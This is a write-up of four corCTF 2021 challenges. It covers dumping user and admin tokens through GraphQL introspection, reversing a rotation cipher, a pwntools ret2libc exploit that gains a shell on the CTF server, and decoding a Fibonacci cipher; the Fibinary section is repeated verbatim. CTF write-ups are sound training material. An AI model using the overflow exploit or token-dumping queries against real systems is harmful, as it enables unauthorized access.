---
layout: post
title: corCTF 2021 Writeup
---

# devme

>
> an ex-google, ex-facebook tech lead recommended me this book!
>
> [https://devme.be.ax](https://devme.be.ax/)



No source code attached, so i try to test the feature one by one. After few second, i've found that the sign up (located at bottom home page) is sending graphql query into https://devme.be.ax/graphql. Since we know that graphql is provided of introspection query by default (cmiiw), we can use GraphiQL tools  [Here](https://www.electronjs.org/apps/graphiql). 



After inserting endpoint, check the documentation explorer for the **query** and **mutation**. In **query** section you will find out users and flag field. Lets check **user** first.

**Request**

```
query{
  users{
    token,
    username
  }
}
```

**Response**

```
{
  "data": {
    "users": [
      {
        "token": "3cd3a50e63b3cb0a69cfb7d9d4f0ebc1dc1b94143475535930fa3db6e687280b",
        "username": "admin"
      },
      .......
```



 Now lets use the token to retreive flag from user admin.



**Request**

```
query{
  flag(token: "3cd3a50e63b3cb0a69cfb7d9d4f0ebc1dc1b94143475535930fa3db6e687280b")
}
```



**Response**

```
{
  "data": {
    "flag": "corctf{ex_g00g13_3x_fac3b00k_t3ch_l3ad_as_a_s3rvice}"
  }
}
```



**FLAG:** corctf{ex_g00g13_3x_fac3b00k_t3ch_l3ad_as_a_s3rvice}





# babyrev

> well uh... this is what you get when you make your web guy make a rev chall



given 1 ELF binary file, lets open it on IDA.

**main()**

~~~c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char j; // al
  int i; // [rsp+8h] [rbp-F8h]
  int v6; // [rsp+Ch] [rbp-F4h]
  size_t v7; // [rsp+10h] [rbp-F0h]
  size_t n; // [rsp+18h] [rbp-E8h]
  char s[64]; // [rsp+20h] [rbp-E0h] BYREF
  char dest[64]; // [rsp+60h] [rbp-A0h] BYREF
  char s1[72]; // [rsp+A0h] [rbp-60h] BYREF
  unsigned __int64 v12; // [rsp+E8h] [rbp-18h]

  v12 = __readfsqword(0x28u);
  fgets(s, 64, stdin);
  s[strcspn(s, "\n")] = 0;
  v7 = strlen(s);
  n = 7LL;
  if ( strncmp("corctf{", s, 7uLL) )
    goto LABEL_12;
  if ( s[v7 - 1] != 125 )
    goto LABEL_12;
  if ( v7 != 28 )
    goto LABEL_12;
  memcpy(dest, &s[n], 28 - n - 1);
  dest[28 - n - 1] = 0;
  for ( i = 0; i < strlen(dest); ++i )
  {
    v6 = 4 * i;
    for ( j = is_prime(4 * i); j != 1; j = is_prime(v6) )
      ++v6;
    s1[i] = rot_n(dest[i], v6);
  }
  s1[strlen(s1) + 1] = 0;
  memfrob(check, 0x14uLL);
  if ( !strcmp(s1, check) )
  {
    puts("correct!");
    return 0;
  }
  else
  {
LABEL_12:
    puts("rev is hard i guess...");
    return 1;
  }
}
~~~

From the code above, we know that the flag length is **28**, start with **corctf{** and end with **}**. The program create loop and check the iterator is prime or not using **is_prime()** function and if some condition are true our input will be passed into **rot_n()** function. 



I very curious about the this code below, so i decided to debug it with gdb

~~~c
memfrob(check, 0x14uLL);
  if ( !strcmp(s1, check) )
  {
    puts("correct!");
    return 0;
  }
~~~

```
 ► 0x55555555558d <main+479>    call   strcmp@plt                <strcmp@plt>
        s1: 0x7fffffffdcf0 ◂— 0x444458524e4c4643 ('CFLNRXDD')
        s2: 0x555555558010 (check) ◂— 'ujp?_oHy_lxiu_zx_uve'
```

We got encoded flag here, ujp?_oHy_lxiu_zx_uve. Now lets explore another function in IDA

**rot_n()**

~~~c
__int64 __fastcall rot_n(unsigned __int8 a1, int a2)
{
  if ( strchr(ASCII_UPPER, (char)a1) )
    return (unsigned __int8)ASCII_UPPER[(a2 + (char)a1 - 65) % 26];
  if ( strchr(ASCII_LOWER, (char)a1) )
    return (unsigned __int8)ASCII_LOWER[(a2 + (char)a1 - 97) % 26];
  return a1;
}
~~~



**is_prime()**

~~~c
__int64 __fastcall is_prime(int a1)
{
  int i; // [rsp+1Ch] [rbp-4h]

  if ( a1 <= 1 )
    return 0LL;
  for ( i = 2; i <= (int)sqrt((double)a1); ++i )
  {
    if ( !(a1 % i) )
      return 0LL;
  }
  return 1LL;
}
~~~



At the first place, i dont know what the result of this loop at **main()**

~~~c
for ( j = is_prime(4 * i); j != 1; j = is_prime(v6) )
      ++v6;
~~~

so i decided to create c source code that implement the code all above.

**loop.c**

~~~C
#include <stdio.h>
#include <math.h>
#include <string.h>

// gcc loop.c -o loop -lm

int is_prime(int a1){
  int i;
  if ( a1 <= 1 )
    return 0;
  for ( i = 2; i <= sqrt(a1); ++i )
  {
    if ( !(a1 % i) )
      return 0;
  }
  return 1;
}



int main(int argc, char const *argv[])
{
	char flag[] = "ujp?_oHy_lxiu_zx_uve";
	int v6;
	for ( int i = 0; i < strlen(flag); ++i ){
	    v6 = 4 * i;
	    for ( int j = is_prime(4 * i); j != 1; j = is_prime(v6) )
	      ++v6;
	  	printf("%d ", v6);	    
	}
}
~~~

```
➜  babyrev git:(master) ✗ gcc loop.c -o loop -lm
➜  babyrev git:(master) ✗ ./loop
2 5 11 13 17 23 29 29 37 37 41 47 53 53 59 61 67 71 73 79
```

After knew what those loop does, i create python script to reverse the rot value.

**solver.py**

~~~python
#!/usr/bin/env python3
from string import ascii_lowercase, ascii_uppercase
def rot_n(a1, a2):
    ASCII_UPPER = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
    ASCII_LOWER = "abcdefghijklmnopqrstuvwxyz"
    if ( chr(a1) in ASCII_UPPER):
        return ASCII_UPPER[(a2 + a1 - 65) % 26];
    if ( chr(a1) in ASCII_LOWER):
        return ASCII_LOWER[(a2 + a1 - 97) % 26];
    return chr(a1);

def main():
    flag = "ujp?_oHy_lxiu_zx_uve"
    prime = [2,5,11,13,17,23,29,29,37,37,41,47,53,53,59,61,67,71,73,79]
    for idx, val in enumerate(prime):
        print(rot_n(ord(flag[idx]), -val), end="")

if __name__ == '__main__':
    main()
~~~

```
➜  babyrev git:(master) ✗ python3 solve.py
see?_rEv_aint_so_bad
```



**FLAG:** corctf{see?_rEv_aint_so_bad}





# Chainblock

> I made a chain of blocks!
>
> nc pwn.be.ax 5000



There are few files that we get, library, binary and source code of binary itself. 

~~~C
#include <stdio.h>

char* name = "Techlead";
int balance = 100000000;

void verify() {
	char buf[255];
	printf("Please enter your name: ");
	gets(buf);

	if (strcmp(buf, name) != 0) {
		printf("KYC failed, wrong identity!\n");
		return;
	}

	printf("Hi %s!\n", name);
	printf("Your balance is %d chainblocks!\n", balance);
}

int main() {
	setvbuf(stdout, NULL, _IONBF, 0);

	printf("      ___           ___           ___                       ___     \n");
	printf("     /\\  \\         /\\__\\         /\\  \\          ___        /\\__\\    \n");
	printf("    /::\\  \\       /:/  /        /::\\  \\        /\\  \\      /::|  |   \n");
	printf("   /:/\\:\\  \\     /:/__/        /:/\\:\\  \\       \\:\\  \\    /:|:|  |   \n");
	printf("  /:/  \\:\\  \\   /::\\  \\ ___   /::\\~\\:\\  \\      /::\\__\\  /:/|:|  |__ \n");
	printf(" /:/__/ \\:\\__\\ /:/\\:\\  /\\__\\ /:/\\:\\ \\:\\__\\  __/:/\\/__/ /:/ |:| /\\__\\\n");
	printf(" \\:\\  \\  \\/__/ \\/__\\:\\/:/  / \\/__\\:\\/:/  / /\\/:/  /    \\/__|:|/:/  /\n");
	printf("  \\:\\  \\            \\::/  /       \\::/  /  \\::/__/         |:/:/  / \n");
	printf("   \\:\\  \\           /:/  /        /:/  /    \\:\\__\\         |::/  /  \n");
	printf("    \\:\\__\\         /:/  /        /:/  /      \\/__/         /:/  /   \n");
	printf("     \\/__/         \\/__/         \\/__/                     \\/__/    \n");
	printf("      ___           ___       ___           ___           ___     \n");
	printf("     /\\  \\         /\\__\\     /\\  \\         /\\  \\         /\\__\\    \n");
	printf("    /::\\  \\       /:/  /    /::\\  \\       /::\\  \\       /:/  /    \n");
	printf("   /:/\\:\\  \\     /:/  /    /:/\\:\\  \\     /:/\\:\\  \\     /:/__/     \n");
	printf("  /::\\~\\:\\__\\   /:/  /    /:/  \\:\\  \\   /:/  \\:\\  \\   /::\\__\\____ \n");
	printf(" /:/\\:\\ \\:|__| /:/__/    /:/__/ \\:\\__\\ /:/__/ \\:\\__\\ /:/\\:::::\\__\\\n");
	printf(" \\:\\~\\:\\/:/  / \\:\\  \\    \\:\\  \\ /:/  / \\:\\  \\  \\/__/ \\/_|:|~~|~   \n");
	printf("  \\:\\ \\::/  /   \\:\\  \\    \\:\\  /:/  /   \\:\\  \\          |:|  |    \n");
	printf("   \\:\\/:/  /     \\:\\  \\    \\:\\/:/  /     \\:\\  \\         |:|  |    \n");
	printf("    \\::/__/       \\:\\__\\    \\::/  /       \\:\\__\\        |:|  |    \n");
	printf("     ~~            \\/__/     \\/__/         \\/__/         \\|__|    \n");
	printf("\n\n");
	printf("----------------------------------------------------------------------------------");
	printf("\n\n");

	printf("Welcome to Chainblock, the world's most advanced chain of blocks.\n\n");

	printf("Chainblock is a unique company that combines cutting edge cloud\n");
	printf("technologies with high tech AI powered machine learning models\n");
	printf("to create a unique chain of blocks that learns by itself!\n\n");

	printf("Chainblock is also a highly secure platform that is unhackable by design.\n");
	printf("We use advanced technologies like NX bits and anti-hacking machine learning models\n");
	printf("to ensure that your money is safe and will always be safe!\n\n");

	printf("----------------------------------------------------------------------------------");
	printf("\n\n");

	printf("For security reasons we require that you verify your identity.\n");

	verify();
}
~~~



As you can see above, this is a classic buffer overflow vulnerability because of using malicious function **gets()**. 

Now lets checksec the binary

```
➜  chainblock git:(master) ✗ checksec chainblock 
[*] '/home/syahrul/Desktop/Writeups/corCTF_2021/pwn/chainblock/chainblock'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x3fe000)
    RUNPATH:  './'
➜  chainblock git:(master) ✗ ldd chainblock
	linux-vdso.so.1 (0x00007ffce2ffe000)
	libc.so.6 => ./libc.so.6 (0x00007f765559d000)
	./ld-linux-x86-64.so.2 => /lib64/ld-linux-x86-64.so.2 (0x00007f765578b000)
```

With minimal security mechanism in binary, we can do technique called ret2libc. The idea is, first we need to leak the base address and send one gadget payload into that binary.

**solver.py**

~~~python
from pwn import *

# f = process("./chainblock")
elf = ELF("./chainblock")
libc = ELF("./libc.so.6")
rop = ROP("./chainblock")

f = remote("pwn.be.ax",5000)

pop_rdi_ret = (rop.find_gadget(['pop rdi', 'ret']))[0]
main = elf.symbols['main']
puts = elf.plt['puts']
got = elf.got['puts']

payload = ""
payload += "A"*264
payload += p64(pop_rdi_ret)
payload += p64(got)
payload += p64(puts)
payload += p64(main)

if len(sys.argv) > 2:
	gdb.attach(f, "b *main+484\nc")

f.sendline(payload)
f.recvuntil("wrong identity!")
f.recvline()

leak = f.recvline().strip()
leak = leak.ljust(8, "\x00")
leak = u64(leak)

base_addr = leak - libc.symbols['puts']

one_gadget = base_addr + 0xde78f

log.info("puts() at : " + str(hex(leak)))
log.info("libc base @ %s" % hex(base_addr))



payload = ""
payload += "A"*264
payload += p64(one_gadget)
f.sendline(payload)

f.interactive()
~~~

```
➜  chainblock git:(master) ✗ python solver.py 
[*] '/home/syahrul/Desktop/Writeups/corCTF_2021/pwn/chainblock/chainblock'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x3fe000)
    RUNPATH:  './'
[*] '/home/syahrul/Desktop/Writeups/corCTF_2021/pwn/chainblock/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] Loaded 14 cached gadgets for './chainblock'
[+] Opening connection to pwn.be.ax on port 5000: Done
[*] puts() at : 0x7efe685919d0
[*] libc base @ 0x7efe68511000
[*] Switching to interactive mode
      ___           ___           ___                       ___     
     /\  \         /\__\         /\  \          ___        /\__\    
    /::\  \       /:/  /        /::\  \        /\  \      /::|  |   
   /:/\:\  \     /:/__/        /:/\:\  \       \:\  \    /:|:|  |   
  /:/  \:\  \   /::\  \ ___   /::\~\:\  \      /::\__\  /:/|:|  |__ 
 /:/__/ \:\__\ /:/\:\  /\__\ /:/\:\ \:\__\  __/:/\/__/ /:/ |:| /\__\
 \:\  \  \/__/ \/__\:\/:/  / \/__\:\/:/  / /\/:/  /    \/__|:|/:/  /
  \:\  \            \::/  /       \::/  /  \::/__/         |:/:/  / 
   \:\  \           /:/  /        /:/  /    \:\__\         |::/  /  
    \:\__\         /:/  /        /:/  /      \/__/         /:/  /   
     \/__/         \/__/         \/__/                     \/__/    
      ___           ___       ___           ___           ___     
     /\  \         /\__\     /\  \         /\  \         /\__\    
    /::\  \       /:/  /    /::\  \       /::\  \       /:/  /    
   /:/\:\  \     /:/  /    /:/\:\  \     /:/\:\  \     /:/__/     
  /::\~\:\__\   /:/  /    /:/  \:\  \   /:/  \:\  \   /::\__\____ 
 /:/\:\ \:|__| /:/__/    /:/__/ \:\__\ /:/__/ \:\__\ /:/\:::::\__\
 \:\~\:\/:/  / \:\  \    \:\  \ /:/  / \:\  \  \/__/ \/_|:|~~|~   
  \:\ \::/  /   \:\  \    \:\  /:/  /   \:\  \          |:|  |    
   \:\/:/  /     \:\  \    \:\/:/  /     \:\  \         |:|  |    
    \::/__/       \:\__\    \::/  /       \:\__\        |:|  |    
     ~~            \/__/     \/__/         \/__/         \|__|    


----------------------------------------------------------------------------------

Welcome to Chainblock, the world's most advanced chain of blocks.

Chainblock is a unique company that combines cutting edge cloud
technologies with high tech AI powered machine learning models
to create a unique chain of blocks that learns by itself!

Chainblock is also a highly secure platform that is unhackable by design.
We use advanced technologies like NX bits and anti-hacking machine learning models
to ensure that your money is safe and will always be safe!

----------------------------------------------------------------------------------

For security reasons we require that you verify your identity.
Please enter your name: KYC failed, wrong identity!
$ cat flag.txt
corctf{mi11i0nt0k3n_1s_n0t_a_scam_r1ght}$
```

**FLAG:** corctf{mi11i0nt0k3n_1s_n0t_a_scam_r1ght}





# Fibinary

> Warmup your crypto skills with the superior number system!

Given 2 files, enc.py and flag.enc. From the name we know that the flag is encrypted using python script. So, lets look into enc.py and flag.enc



**flag.enc**

```
10000100100 10010000010 10010001010 10000100100 10010010010 10001000000 10100000000 10000100010 00101010000 10010010000 00101001010 10000101000 10000010010 00101010000 10010000000 10000101000 10000010010 10001000000 00101000100 10000100010 10010000100 00010101010 00101000100 00101000100 00101001010 10000101000 10100000100 00000100100
```

**enc.py**

~~~python
fib = [1, 1]
for i in range(2, 11):
	fib.append(fib[i - 1] + fib[i - 2])

def c2f(c):
	n = ord(c)
	b = ''
	for i in range(10, -1, -1):
		if n >= fib[i]:
			n -= fib[i]
			b += '1'
		else:
			b += '0'
	return b

flag = open('flag.txt', 'r').read()
enc = ''
for c in flag:
	enc += c2f(c) + ' '
with open('flag.enc', 'w') as f:
	f.write(enc.strip())
~~~



The interesting code is

~~~python
flag = open('flag.txt', 'r').read()
enc = ''
for c in flag:
	enc += c2f(c) + ' '
~~~



By looking at the piece above, we know that our flag is encrypted using c2f() per character. Therefore, we dont need to understanding what the c2f() function does. We just need brute force the flag by generating all ascii character and pass it into c2f() function. And then we can replace encrypted flag with our ascii value. 

**solver.py**

~~~python
import string


charlist = list(string.printable)

fib = [1, 1]
for i in range(2, 11):
	fib.append(fib[i - 1] + fib[i - 2])

def c2f(c):
	n = ord(c)
	b = ''
	for i in range(10, -1, -1):
		if n >= fib[i]:
			n -= fib[i]
			b += '1'
		else:
			b += '0'
	return b


enc_charlist = [c2f(i) for i in charlist]
charlist = dict(zip(charlist, enc_charlist))

with open("flag.enc") as enc:
	flag = enc.read()
	for k, v in charlist.items():
		flag = flag.replace(v, k)
	print(flag)
~~~



**FLAG:** corctf{b4s3d_4nd_f1bp!113d}





# Fibinary

> Warmup your crypto skills with the superior number system!

Given 2 files, enc.py and flag.enc. From the name we know that the flag is encrypted using python script. So, lets look into enc.py and flag.enc



**flag.enc**

```
10000100100 10010000010 10010001010 10000100100 10010010010 10001000000 10100000000 10000100010 00101010000 10010010000 00101001010 10000101000 10000010010 00101010000 10010000000 10000101000 10000010010 10001000000 00101000100 10000100010 10010000100 00010101010 00101000100 00101000100 00101001010 10000101000 10100000100 00000100100
```

**enc.py**

~~~python
fib = [1, 1]
for i in range(2, 11):
	fib.append(fib[i - 1] + fib[i - 2])

def c2f(c):
	n = ord(c)
	b = ''
	for i in range(10, -1, -1):
		if n >= fib[i]:
			n -= fib[i]
			b += '1'
		else:
			b += '0'
	return b

flag = open('flag.txt', 'r').read()
enc = ''
for c in flag:
	enc += c2f(c) + ' '
with open('flag.enc', 'w') as f:
	f.write(enc.strip())
~~~



The interesting code is

~~~python
flag = open('flag.txt', 'r').read()
enc = ''
for c in flag:
	enc += c2f(c) + ' '
~~~



By looking at the piece above, we know that our flag is encrypted using c2f() per character. Therefore, we dont need to understanding what the c2f() function does. We just need brute force the flag by generating all ascii character and pass it into c2f() function. And then we can replace encrypted flag with our ascii value. 

**solver.py**

~~~python
import string


charlist = list(string.printable)

fib = [1, 1]
for i in range(2, 11):
	fib.append(fib[i - 1] + fib[i - 2])

def c2f(c):
	n = ord(c)
	b = ''
	for i in range(10, -1, -1):
		if n >= fib[i]:
			n -= fib[i]
			b += '1'
		else:
			b += '0'
	return b


enc_charlist = [c2f(i) for i in charlist]
charlist = dict(zip(charlist, enc_charlist))

with open("flag.enc") as enc:
	flag = enc.read()
	for k, v in charlist.items():
		flag = flag.replace(v, k)
	print(flag)
~~~



**FLAG:** corctf{b4s3d_4nd_f1bp!113d}

